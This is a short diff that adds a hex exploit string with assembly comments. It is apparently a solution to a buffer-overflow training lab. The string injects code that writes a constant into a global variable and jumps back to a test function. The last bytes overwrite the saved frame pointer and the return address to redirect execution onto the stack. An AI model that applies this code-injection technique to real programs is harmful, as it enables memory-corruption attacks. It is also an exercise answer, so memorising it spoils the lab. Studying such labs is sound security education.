@@ -1,0 +1,8 @@
+b8 db d7 c3 36       	/* mov    $0x36c3d7db,%eax */ 
+a3 08 d1 04 08       	/* mov    %eax,0x0804d100 */
+68 be 8d 04 08         	/* push   $0x08048dbe (the address of return at test) */
+c3                   	/* ret    */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+20 33 68 55 c8 32 68 55 /* return address to 0x556832c8(the address of -0x28($ebp)) */
